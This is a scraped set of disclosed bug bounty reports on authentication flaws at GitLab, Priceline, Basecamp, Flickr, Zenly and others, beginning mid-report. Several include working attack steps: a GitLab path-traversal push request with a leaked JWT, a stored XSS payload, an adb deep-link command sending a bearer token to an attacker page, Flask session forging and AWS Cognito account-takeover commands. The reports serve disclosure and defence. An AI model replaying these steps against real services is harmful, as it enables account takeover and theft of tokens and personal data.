HTTP/1.1 200 OK
Server: nginx
Date: Sun, 22 Nov 2020 17:45:01 GMT
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Etag: W/"2db9b0c1229e01c96956b4ed4ed32f3d"
Vary: Origin
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Request-Id: wNp4wblZQ42
X-Runtime: 0.119849
Strict-Transport-Security: max-age=31536000
Referrer-Policy: strict-origin-when-cross-origin
Content-Length: 2540

--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="import_url"

http://gitlab3.example.vm/test/ttt
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.name"

test.txt
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.path"

/opt/gitlab/embedded/service/gitlab-rails/public/uploads/tmp/test.txt403239251
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.md5"

b326b5062b2f0e69046810717534cb09
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.sha256"

b5bea41b6c623f7c09f1bf24dcae58ebab3c0cdd90ad966bc43a45b44867e12b
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.gitlab-workhorse-upload"

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1cGxvYWQiOnsibWQ1IjoiYjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDkiLCJuYW1lIjoidGVzdC50eHQiLCJwYXRoIjoiL29wdC9naXRsYWIvZW1iZWRkZWQvc2VydmljZS9naXRsYWItcmFpbHMvcHVibGljL3VwbG9hZHMvdG1wL3Rlc3QudHh0NDAzMjM5MjUxIiwicmVtb3RlX2lkIjoiIiwicmVtb3RlX3VybCI6IiIsInNoYTEiOiI1ZmZlNTMzYjgzMGYwOGEwMzI2MzQ4YTkxNjBhZmFmYzhhZGE0NGRiIiwic2hhMjU2IjoiYjViZWE0MWI2YzYyM2Y3YzA5ZjFiZjI0ZGNhZTU4ZWJhYjNjMGNkZDkwYWQ5NjZiYzQzYTQ1YjQ0ODY3ZTEyYiIsInNoYTUxMiI6IjkxMjBjZDVmYWVmMDdhMDhlOTcxZmYwMjRhM2ZjYmVhMWUzYTZiNDQxNDJhNmQ4MmNhMjhjNmM0MmU0Zjg1MjU5NWJjZjUzZDgxZDc3NmYxMDU0MTA0NWFiZGI3YzM3OTUwNjI5NDE1ZDBkYzY2YzhkODZjNjRhNTYwNmQzMmRlIiwic2l6ZSI6IjQifSwiaXNzIjoiZ2l0bGFiLXdvcmtob3JzZSJ9.xvDjfRCxUK1bfLyM97sxiORbKmGLBr5Tte2c7ywSGz0
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.remote_id"


--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.size"

4
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.remote_url"


--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.sha512"

9120cd5faef07a08e971ff024a3fcbea1e3a6b44142a6d82ca28c6c42e4f852595bcf53d81d776f10541045abdb7c37950629415d0dc66c8d86c64a5606d32de
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.sha1"

5ffe533b830f08a0326348a9160afafc8ada44db
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a--

```

Take note of this value

**Unauthorizing push to readable project**
Assuming:

User B has Project B set public or internal without any user can push.
User B upload an SSH-KEY.

- Login as another user.
- Navigate to project B that you don't have the push access.
- Fork the project
- Clone the forked project using HTTP
- Push any file to the Project but intercept the request

When sending the request to `<project-forked-path>.git/git-receive-pack`
Change the path from  `<project-forked-path>.git/git-receive-pack` to `/-/push_from_secondary/2/<project-path>.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack `
Adding the `Gitlab-Workhorse-Api-Request` Header with the value is the value noted in the first part
Adding the `Geo-GL-Id` with the value `key-<id>` with `<id>` as the ID of any key of a user who has push access to the project which is user B, This could be brute-forced as it is incremental integer from 1.
The request should look likes

```http
POST /-/push_from_secondary/2/rrr/dsds.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack HTTP/1.1
Host: gitlab3.example.vm
Geo-GL-Id: key-1
User-Agent: git/2.28.0
Accept-Encoding: gzip, deflate
Gitlab-Workhorse-Api-Request: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1cGxvYWQiOnsibWQ1IjoiYjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDkiLCJuYW1lIjoidGVzdC50eHQiLCJwYXRoIjoiL29wdC9naXRsYWIvZW1iZWRkZWQvc2VydmljZS9naXRsYWItcmFpbHMvcHVibGljL3VwbG9hZHMvdG1wL3Rlc3QudHh0NDAzMjM5MjUxIiwicmVtb3RlX2lkIjoiIiwicmVtb3RlX3VybCI6IiIsInNoYTEiOiI1ZmZlNTMzYjgzMGYwOGEwMzI2MzQ4YTkxNjBhZmFmYzhhZGE0NGRiIiwic2hhMjU2IjoiYjViZWE0MWI2YzYyM2Y3YzA5ZjFiZjI0ZGNhZTU4ZWJhYjNjMGNkZDkwYWQ5NjZiYzQzYTQ1YjQ0ODY3ZTEyYiIsInNoYTUxMiI6IjkxMjBjZDVmYWVmMDdhMDhlOTcxZmYwMjRhM2ZjYmVhMWUzYTZiNDQxNDJhNmQ4MmNhMjhjNmM0MmU0Zjg1MjU5NWJjZjUzZDgxZDc3NmYxMDU0MTA0NWFiZGI3YzM3OTUwNjI5NDE1ZDBkYzY2YzhkODZjNjRhNTYwNmQzMmRlIiwic2l6ZSI6IjQifSwiaXNzIjoiZ2l0bGFiLXdvcmtob3JzZSJ9.xvDjfRCxUK1bfLyM97sxiORbKmGLBr5Tte2c7ywSGz0
Content-Type: application/x-git-receive-pack-request
Accept: application/x-git-receive-pack-result
Content-Length: 436
Connection: close

00a822cc76ea883341147a10ad83f9994bb9a89d79d9 02c1e26f4d449d265e87e2906933ff0a2a5f275d refs/heads/master report-status side-band-64k object-format=sha1 agent=git/2.28.00000PACKxËA
B!Ð½§póõ;Dtö-gt¢ óc
uûºBÛotU[" q(IYÐ«EsE¨dÌ(´*Ù¸ësØeÉ£rJÞKòW"
"Ä
R!ÃsÜZ·6»=sU{ø´yÒ7×í¡ûÜêÑBtÑ!ø°ÚCçÌOë}ý³¡¯a¾kå=ÕúsVOæme²6
Az^×ÿÜTx*Õÿ»Ó lll2332.txt¨'FÛN^ÁÎZÐpå}Í"¶Ü¿³ÐÌHt!4x+))á"gøÈÎ.LG^gßygßÿæ5,
```

Video:
Sorry had to tone down the size because of 256 mb limit :( 

{F1090024}

###Results of GitLab environment info

```
System information
System:     Ubuntu 16.04
Proxy:      no
Current User:   git
Using RVM:  no
Ruby Version:   2.6.6p146
Gem Version:    2.7.10
Bundler Version:1.17.3
Rake Version:   12.3.3
Redis Version:  5.0.9
Git Version:    2.28.0
Sidekiq Version:5.2.9
Go Version: unknown

GitLab information
Version:    13.5.3-ee
Revision:   b9d194b6b91
Directory:  /opt/gitlab/embedded/service/gitlab-rails
DB Adapter: PostgreSQL
DB Version: 11.9
URL:        http://gitlab.example.vm
HTTP Clone URL: http://gitlab.example.vm/some-group/some-project.git
SSH Clone URL:  git@gitlab.example.vm:some-group/some-project.git
Elasticsearch:  no
Geo:        no
Using LDAP: no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:    13.11.0
Repository storage paths:
- default:  /var/opt/gitlab/git-data/repositories
GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell
Git:        /opt/gitlab/embedded/bin/git
```

## Impact

Unauthorized push to repositories, exposing Workhorse JWT

---

### [Sign in with Apple works on existing accounts, bypasses 2FA](https://hackerone.com/reports/1593404)

- **Report ID:** `1593404`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @mattipv4
- **Bounty:** 1000 usd
- **Disclosed:** 2022-06-27T16:24:28.346Z
- **CVE(s):** -

**Summary (team):**

It was possible to bypass configured Cloudflare 2FA when logging in to a Cloudflare account using Apple ID authentication flow. 
A malicious actor could access a Cloudflare account by setting up an Apple ID account using e-mail address matching the one used to set up the targeted account.
The issue could affect customers who did not have an Apple ID account created with an e-mail address that was linked to their Cloudflare profile or whose Apple ID account was compromised by an attacker.
The fix was released by the relevant engineering team that prevents such 2FA bypass attempts.

---

### [Authentication CSRF resulting in unauthorized account access on Krisp app](https://hackerone.com/reports/1267476)

- **Report ID:** `1267476`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Krisp
- **Reporter:** @yassineaboukir
- **Bounty:** - usd
- **Disclosed:** 2022-06-20T15:51:10.973Z
- **CVE(s):** -

**Summary (team):**

@yassineaboukir has identified and reported a CSRF issue on our desktop applications authentication flow affecting account dashboard that could result in an unauthorized access of a user account.
We would like to thank Yassine Aboukir for reporting it responsibly to our bug bounty program !

---

### [Broken access control ](https://hackerone.com/reports/1539426)

- **Report ID:** `1539426`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** UPS VDP
- **Reporter:** @nayefhamouda
- **Bounty:** - usd
- **Disclosed:** 2022-06-18T16:40:08.872Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
hello ups team ,,,
I've found broken access control vulnerability in your sites 
It allows me to access the admin panel of the support team, and I can view all requests within the site

vulnerable domains:**█████**
## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. go to **█████████** 
  2. go to **████████████████** ,put any email address and intercept the request
  
```
POST /api/Account/SendTempPassword/?userName=█████████████ HTTP/2
Host: ██████████████████
Cookie: ████████
Content-Length: 0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"
Accept: application/json, text/plain, */*
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Origin: ██████████████████
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,ar;q=0.7


```
  3.On the burp site, intercept the response for this request and change this value to 
Then change the **"status"** value of this request from false to true

##response:

```
HTTP/2 200 OK
Cache-Control: no-cache,no-cache,no-store
Pragma: no-cache,no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: 
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains;preload
X-Frame-Options: DENY
X-Ua-Compatible: IE=Edge
Content-Security-Policy: script-src 'self'; object-src 'self'; frame-ancestors 'none'
Expect-Ct: enforce, max-age=7776000, report-uri='███████████████-Allow-Headers: Accept, Content-Type, Origin
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Date: ██████████████████ ████████████ GMT
Content-Length: 89

{"status":true,"errorMessage":"Username does not exist. Please enter correct Username."}
```

  4. After that, go to this path  **/resetPassword** You will notice that this page has been opened without problems

███████████

Go to user or report and you will notice that it opens normally and you can fully control it

I made a video of the vulnerability that you can watch

##video POC:

███████

## Impact

The attacker can hack the admin control panel and view and modify all reports

---

### [Account takeover via Google OneTap](https://hackerone.com/reports/671406)

- **Report ID:** `671406`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Priceline
- **Reporter:** @badca7
- **Bounty:** - usd
- **Disclosed:** 2022-05-11T09:37:14.985Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

It's possible to take over any priceline.com user's account knowing their email. The only requirement is that the victim's email domain is not registered with Google's Gsuite. The root cause of this issue is that the backend does not verify whether the email provided is a confirmed one.

## Steps To Reproduce:

1. Create Account A (in my case `badca7@wearehackerone.com`) with priceline.com, without any SSO, via the "Create an account" link (aka "register with email").
2. Once the account has been created, add a dummy phone number to the profile. It will serve as a canary to demonstrate we accessed the same data in the next steps.
3. In another browser/session (eg, incognito/private mode) sign up for a trial GSuite account at https://gsuite.google.com/signup/basic/welcome  . This will be Account B.
4. Use any email to register as you won't need to confirm that email. 
5. When the wizard comes to the "Does your business have a domain?" confirm and enter `wearehackerone.com` (or any other domain that hosts the victim's email box) as in F552718. You may not use the same domain name at this stage, as I claimed it for the purposes of this PoC however you can do so when my GSuite trial expires. From this comes the requirement that the victim's email domain name must not be registered with Google prior to this attack. 
6. Once you saved the domain record with Google, stop there as there's no need to verify the domain.
7. At this stage the OneTap/GoogleYOLO popup will be showing on priceline.com when visited in the same browser session. It took me some time to get it to show however signing in and out of Google Account several times with the newly created GSuite credentials and then refreshing the priceline.com page helped. On another occasion a Gmail account, which I signed in in the same browser window helped too. You may need to play around with these until you see the newly created account to show in the list. F552723 
8. Once you have that, just sign in (`badca7@wearehackerone.com` in my case). You can confirm you accessed Account A by seeing the phone number you added in step (2). In the other browser window/session with Account A you can see that now there are two accounts showing in the top right corner and the profile data is blank.
9. Account takeover complete. F552724

# Notes

- IP used for this PoC: ███

## Impact

Attackers can take over any priceline.com account given they were able to register a specific domain with GSuite.

---

### [Account takeover leading to PII chained with stored XSS](https://hackerone.com/reports/1483201)

- **Report ID:** `1483201`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. General Services Administration
- **Reporter:** @imthatt
- **Bounty:** - usd
- **Disclosed:** 2022-04-16T08:20:52.040Z
- **CVE(s):** -

**Vulnerability Information:**

## 
I have found a vulnerability on https://vehiclestdb.fas.gsa.gov/ for account takeovers
The website is not using proper authentication to claim the user signing in is actually the account owner due to only requiring an email address to sign in and no password. This leads to an attacker being able to place a stored XSS payload within the victims profile and reveals PII including phone numbers of the victim. 

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Visit https://vehiclestdb.fas.gsa.gov/
  2. Enter  email address in the signing form itsdavenn@gmail.com (or for official account use tesg@gsa.gov)
  3. You have now signed in as a users account you do not own and if you browse to the profile you can see PII in the form of phone numbers.
4. We can do this with any registered user
5. You can place an XSS stored payload on the users profile in the first name field using ant" autofocus onfocus=prompt(1) x=" 

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]
Please re create these steps to see the impact

## Impact

An attacker can takeover any users account from just knowing the email address, from here on in they can find PII in the form of phone numbers and place stored XSS on the users profile to execute JavaScript code on the users profile.

---

### [Able to steal bearer token from deep link](https://hackerone.com/reports/1372667)

- **Report ID:** `1372667`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Basecamp
- **Reporter:** @danielllewellyn
- **Bounty:** 6337 usd
- **Disclosed:** 2022-03-27T18:33:05.264Z
- **CVE(s):** -

**Vulnerability Information:**

# Pre-requisities

Prior to exploitation you would be required to know the "account id" of the user that you are attacking. Whilst this makes it difficult to attack an application in a generic way - the account is not secret information as it is included in any links to a user's basecamp organisation. E.g

https://3.basecamp.com/5218370/

# Attack

The attack involves forcing the user to enter the application either by starting an intent from an application on the device already, or by triggering a deep link (which can be done by with e.g. a phishing email) . The link should be in this format:

https://3.basecamp.com/<accountId>/verify?proceed_to=<attacker controlled URL>

Here is a sample adb command that can be used to test the attack:

```sh
adb shell am start -n com.basecamp.bc3/com.basecamp.bc3.activities.BasecampUrlFilterActivity https://3.basecamp.com/5218370/verify?proceed_to=https://haystack-production-storage.s3.eu-west-2.amazonaws.com/attack.html
```

The second part of the attack involves redirecting someone using the turbo links API that is exposed through the javascript native bridge. Here is the example:

```js
<script>NativeApp.openNativeImageViewer("[{'download_url': 'https://us-central1-andro-3982e.cloudfunctions.net/home/5218370/image.jpg', 'preview_url': 'https://us-central1-andro-3982e.cloudfunctions.net/home/5218370/image.jpg', 'caption':'ViewImage'}]", 0)</script>
```

This script executes 'openNativeImageViewer' and passes the download_url and preview_url. The preview_url is the most interesting, as it requires not user interaction. In order to render a preview image, the basecamp app sends the JWT header to the site, meaning that the 'preview_url' will receive that header.

# Vulnerability

The clearest vulnerability is that the check to determine if a URL is an 'internal' URL allows it to by bypassed in a limited way by using the /verify? url along with a proceed_to that is attacker controlled. 

```java
if (TuroblinksUrlHandler.contains(url, "/verify?", true)) {
                C3982h.nullCheck(url, "$this$proceedToParam");
                C3982h.nullCheck(url, "$this$extractQueryParam");
                C3982h.nullCheck("proceed_to", "queryKey");
                String queryParameter = url.toUri().getQueryParameter("proceed_to");
                url = queryParameter != null ? UrlKt.parseUrl(queryParameter) : null;
                C3982h.nullCheck(url);
            }

 Intent intent10 = new Intent(context, WebViewActivity.class);
                    C1071a.addUrlsToIntent(url, intent10, "intentUrl", "intentApiUrl", null);
                    return intent10;
```

## Impact

An attacker could, without physical access to the device, retrieve a user's authentication tokens. A potentially compounding factor is that once a user has been exploited, it might be possible to continue the chain of attack by having that compromised user share links with other users who trust links sent by the compromised user.

---

### [PIN 📌 BYPASS 🥷](https://hackerone.com/reports/1257586)

- **Report ID:** `1257586`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Yoti
- **Reporter:** @theendisnear
- **Bounty:** - usd
- **Disclosed:** 2022-03-18T22:25:25.806Z
- **CVE(s):** -

**Summary (team):**

## Summary
A PIN bypass vulnerability is discovered in the iOS application where the rate limiting mechanism for PIN attempts can be circumvented by manipulating the device's local date/time settings. The application implements a 5-minute lockout period after 5-6 failed PIN attempts, however, this security control is found to rely on the device's local time settings rather than server-side validation. By altering the device's date/time settings, an attacker can bypass this rate limit restriction and continue attempting to brute force the PIN without waiting for the lockout period to expire.

## Steps to Reproduce
1. Install the iOS application from the App Store
2. Create a PIN within the application
3. Close and reopen the application
4. When prompted for PIN entry, attempt multiple incorrect PINs
5. After 5-6 failed attempts, observe the 5-minute lockout message
6. Change the device's date/time settings
7. Return to the application and verify that additional PIN attempts can be made without waiting for the lockout period

## Impact
The vulnerability allows an attacker to perform unlimited PIN attempts by bypassing the rate limiting mechanism, potentially leading to unauthorized access to user accounts through PIN brute-forcing. This represents a significant authentication bypass that could compromise user account security.

The CWE-287 (Improper Authentication) category typically results in:
- Unauthorized access to user accounts
- Bypass of authentication mechanisms
- Compromise of user data and privacy
- Potential full account takeover
- Circumvention of security controls meant to protect user accounts

---

### [Incorrect authorization to the intelbot service leading to ticket information](https://hackerone.com/reports/1328546)

- **Report ID:** `1328546`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** TikTok
- **Reporter:** @johnstone
- **Bounty:** 15000 usd
- **Disclosed:** 2022-02-23T00:09:52.663Z
- **CVE(s):** -

**Summary (team):**

An authentication bypass and site wide stored XSS (cross-site scripting) vulnerability was found on TikTok Ads as JWT (JSON Web Token) was not verified properly. We thank @johnstone for reporting this to our team and confirming its resolution.

---

### [Уязвимость в приложении для Android](https://hackerone.com/reports/1343528)

- **Report ID:** `1343528`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** VK.com
- **Reporter:** @executor
- **Bounty:** 3000 usd
- **Disclosed:** 2022-02-18T19:09:54.418Z
- **CVE(s):** -

**Summary (team):**

Некорректная обработка событий.

**Summary (researcher):**

Уязвимость позволяла "угонять" токен аутентификации пользователя с помощью виджетов Маруси
{F1624996}

---

### [Critical full compromise of jarvis-new.urbanclap.com via weak session signing](https://hackerone.com/reports/1380121)

- **Report ID:** `1380121`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Urban Company
- **Reporter:** @ian
- **Bounty:** 1500 usd
- **Disclosed:** 2022-01-30T20:03:00.574Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
Hi there, I discovered that jarvis-new.urbanclap.com uses a weak Flask session key. Because Flask sessions are signed with a static secret, if this secret is known to an attacker then they can modify the session state. In this case, we can modify the Redash `user_id` for the session and log in as any user. **This results in a full compromise of the instance.** I have attached a screenshot showing that I logged into `█████████@urbancompany.com` and have full admin permissions:

██████████
████
██████████
███████

## How to fix
Change the `REDASH_COOKIE_SECRET` and `REDASH_SECRET_KEY` to a random value immediately.

## PoC
For simplicity, it is easiest to forge a password reset link for Redash. We can do this with a bit of Python. To get the reset link for user ID 1, we simply run:
```
>>> from itsdangerous import URLSafeTimedSerializer, SignatureExpired, BadSignature
>>> serializer = URLSafeTimedSerializer("███")
>>> serializer.dumps(str("1"))
'███'
```

Then, we can browse to `https://jarvis-new.urbanclap.com/reset/█████` and choose a new password for user ID 1. This then logs us into their account.

## Impact

Since this is connected to all of your databases, this is likely a significant leak of PII and other sensitive information. This is easily a critical issue.

---

### [Account Takeover via SMS Authentication Flow ](https://hackerone.com/reports/1245762)

- **Report ID:** `1245762`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Zenly
- **Reporter:** @yetanotherhacker
- **Bounty:** - usd
- **Disclosed:** 2022-01-12T10:08:30.046Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
During the **authentication** flow, an SMS is sent to the user in order to validate the session and proceed to the user account. The way Zenly API handles this flow is by:
1. Calling the `/SessionCreate` endpoint with the mobile phone number of the user.
2. A session for the user is created and a session token is returned, but no operations with this session are possible until the verification is complete.
3. An SMS message is sent to the user, containing a verification code.
4. Calling the `/SessionVerify` endpoint with both the session token and the verification code received by SMS.
5. Once this request is successfully completed, the session token becomes valid and the user is now logged in.
After the first call to `/SessionCreate`, subsequent calls will return ==the same session token==, until a call to `/SessionVerify` is made with a valid verification code. 

## Steps To Reproduce:
To reproduce this issue, an environment that enables intercepting and decoding network requests is required. Once this environment is set up, we are able to gain visibility over network activity.
By following a typical login flow, we can gain knowledge of the network requests that are involved. The flow starts by requesting the mobile phone number from the user. Once the user inputs their phone number, they will be prompted for a verification code that is sent through SMS.
{F1355357}
At this moment, before entering the verification code, a request to `/SessionCreate` is launched. Note that this request (on the left) contains the mobile phone number of the user, and the response (on the right) to this request contains a **session token**, as shown below.
███████
Now, if an attacker also sends a request to `/SessionCreate` with the mobile phone number of the legitimate user, they will obtain the same session token. The response to this request, initiated by the attacker, is shown below:
█████████
**Note:** In this example, the attacker called `/SessionCreate` after the legitimate user. However, the attacker could also have called `/SessionCreate` before the legitimate user. This would have caused Zenly (on the side of the legitimate user) to obtain **the same session token that the attacker obtained**.
At this moment, the legitimate user will receive an SMS message containing a verification code. The authentication flow is finished (meaning the session token will become valid) once the user inputs this code in their Zenly application. However, once the user does this, the attacker will also end up with a valid session token in their hands (**since it is the same token**).
The attacker can then use this token to impersonate the legitimate user, executing any request to the Zenly API with it. The attacker can also, at any time, check if the session token is valid by launching a request to `/Me`, an endpoint that returns information about the current session. If the verification code has not yet been entered by the legitimate user, requests to `/Me` will return a 401 Unauthorized response. Once the code is entered, requests to `/Me` will return session information (such as phone number and user identifier), as shown below:
████
Once the attacker knows the session is valid, they can launch requests to `███████`, `██████` or `████` instead, thus **gaining access to notifications, geolocation, and conversations** of the legitimate user and their friends. 

## Suggested Mitigation:
In order to mitigate this issue, the following steps could be taken:
-	Session tokens should be unique for each call to `/SessionCreate`.
-	A new SMS code should be sent on every call to `/SessionCreate`.
-	Previous SMS codes should be invalidated once a new one is sent.
-	Apply rate-limiting to both `/SessionCreate` and `/SessionVerify` endpoints.

## Impact

An attacker can take over a user account by abusing the `/SessionCreate endpoint`, which will consistently return the same session token (although not yet valid) for the same user. Once the legitimate user validates the SMS code for that session token, the session will become valid for both the legitimate user and the attacker.
The main point of this issue is that the attacker needs to obtain a session token before the legitimate user calls the `/SessionVerify` endpoint. This can be done either before or after the legitimate user calls the `/SessionCreate endpoint`. 
Allowing both the legitimate user and an attacker to have the same session token will give an advantage to the attacker. The verification code sent through SMS will remain valid for the same amount of time that the session token is valid, and it will not be regenerated within that time period, meaning that if the legitimate user inputs this code in the application (triggering a call to `/SessionVerify`), the session token that both the legitimate user and the attacker hold will become valid. This means that the attacker now has a valid session for the account of the legitimate user, even though the attacker never knew the verification code.
On the other hand, even if the attacker wasn’t able to obtain the session token (through a call to `/SessionCreate`) before the legitimate user, this attack is still possible while the legitimate user doesn’t input the correct verification code in the application, although this scenario would be less likely since the time window for carrying out this attack can be rather short.
**Once the attacker has a valid session for the account of the legitimate user, they can access their location, notifications, conversations, and friends’ information just like the legitimate user could.**

**Summary (team):**

An attacker could have taken over a future user account by abusing the session creation endpoint, which was consistently returning the same session token (although not yet valid) for the same user. 
Once the legitimate user validates the SMS code for that session token, the session would have become valid for both the legitimate user and the attacker.

---

### [See drafts and post articles if the account owner hasn't set password (livedoor CMS plugin)](https://hackerone.com/reports/1278881)

- **Report ID:** `1278881`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** LY Corporation
- **Reporter:** @akichia
- **Bounty:** - usd
- **Disclosed:** 2021-12-27T01:47:00.887Z
- **CVE(s):** -

**Summary (team):**

For new accounts that haven't set passwords yet, an attacker is able to see drafts or post articles as victims.

---

### [Flickr Account Takeover using AWS Cognito API](https://hackerone.com/reports/1342088)

- **Report ID:** `1342088`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Flickr
- **Reporter:** @lauritz
- **Bounty:** - usd
- **Disclosed:** 2021-12-18T00:35:49.568Z
- **CVE(s):** -

**Vulnerability Information:**

Flickr uses [Amazon Cognito](https://aws.amazon.com/de/cognito/) to implement its login functionality.

Furthermore, Flickr does not allow users to change their registered e-mail address via the user interface. This restriction can be bypassed via direct communication with the Amazon Cognito *User Pool* API.

Consider we have the following accounts:
1. flickr-benign@lauritz-holtmann.de (our victim)
2. An arbitrary other account that is controlled by the attacker - in the following flickr-attacker@lauritz-holtmann.de

At first, the malicious actor needs to obtain an Amazon `access_token`. To do so, intercept the login request that is sent from https://identity.flickr.com/:
```http
POST / HTTP/2
Host: cognito-idp.us-east-1.amazonaws.com
[...]

{
    "AuthFlow":"USER_PASSWORD_AUTH",
    "ClientId":"3ck15a1ov4f0d3o97vs3tbjb52",
    "AuthParameters":{
        "USERNAME":"flickr-attacker@lauritz-holtmann.de",
        "PASSWORD":"[REDACTED]",
        "DEVICE_KEY":"us-east-1_07032954-25bf-4781-b596-9d675d901072"
    },
    "ClientMetadata":
    {                
    }
}
```

If the provided credentials for the attacker controlled account are valid, Amazon responds with tokens:
```http
HTTP/2 200 OK
Date: Thu, 16 Sep 2021 22:51:36 GMT
[...]

{
    "AuthenticationResult":    
        {
            "AccessToken":"[REDACTED]",
            "ExpiresIn":3600,
            "IdToken":"[REDACTED]",
            "RefreshToken":"[REDACTED]",
            "TokenType":"Bearer"
        },
    "ChallengeParameters":
        {            
        }
}
```

The `access_token` can be directly used against Amazon's AWS API, for instance using the [AWS Command Line Interface](https://docs.aws.amazon.com/cli/) tool:

```bash
$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]
{
    "Username": "e28c344[...]",
    "UserAttributes": [
        {
            "Name": "sub",
            "Value": "e28[...]"
        },
        {
            "Name": "birthdate",
            "Value": "1998-09-17"
        },
        {
            "Name": "email_verified",
            "Value": "true"
        },
        {
            "Name": "locale",
            "Value": "en-us"
        },
        {
            "Name": "given_name",
            "Value": "Axel"
        },
        {
            "Name": "family_name",
            "Value": "Attacker"
        },
        {
            "Name": "email",
            "Value": "flickr-attacker@lauritz-holtmann.de"
        }
    ]
}
```

Using the API, one is able to alter some of the user attributes - including the linked e-mail address:
```bash
$ aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=flickr-Benign@lauritz-holtmann.de
{
    "CodeDeliveryDetailsList": [
        {
            "Destination": "f***@l***.de",
            "DeliveryMedium": "EMAIL",
            "AttributeName": "email"
        }
    ]
}
```

Note that the registered address is **case sensitive**.
As the above output already indicates, at this stage, the e-mail address is not verified:
```bash
$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQi[...] 
{
    "Username": "e28c34[...]",
    "UserAttributes": [
        {
            "Name": "sub",
            "Value": "e2[...]"
        },
        {
            "Name": "birthdate",
            "Value": "1998-09-17"
        },
        {
            "Name": "email_verified",
            "Value": "false"
        },
        {
            "Name": "locale",
            "Value": "en-us"
        },
        {
            "Name": "given_name",
            "Value": "Axel"
        },
        {
            "Name": "family_name",
            "Value": "Attacker"
        },
        {
            "Name": "email",
            "Value": "flickr-Benign@lauritz-holtmann.de"
        }
    ]
}
```

Strikingly, it is still possible to login at Flickr using the case-sensitive, not-verified victim e-mail address using the attacker's password:
{F1451108}
As the above video illustrates, the attacker has to make sure that within the outgoing HTTP request the capitalization of the e-mail address is as intended.

## Conclusion
The aforementioned behavior can be tracked down to the following root issues
1) Flickr does not expect e-mail addresses to be changed - still it is possible to change a user's address using the AWS Cognito API.
2) Flickr does not check whether the e-mail address is verified on login
3) Flickr normalizes the e-mail address received from AWS cognito, so that collisions are possible

## Impact

Chained as shown above, the aforementioned  vulnerabilities can be used to takeover a user's account without any user interaction. 

A malicious solely needs to know the e-mail address that is linked within a victim's account to link a crafted e-mail address to their account that can then be used to takeover the victim's account.

## Further Notices
All tests were performed against my user accounts. The user account patterns used were as follows:
* lauritz+*@wearehackerone.com
* *@lauritz-holtmann.de

Please let me know if you have any comments or questions.

**Summary (researcher):**

I published a deep dive into this vulnerability in a blog post: https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/

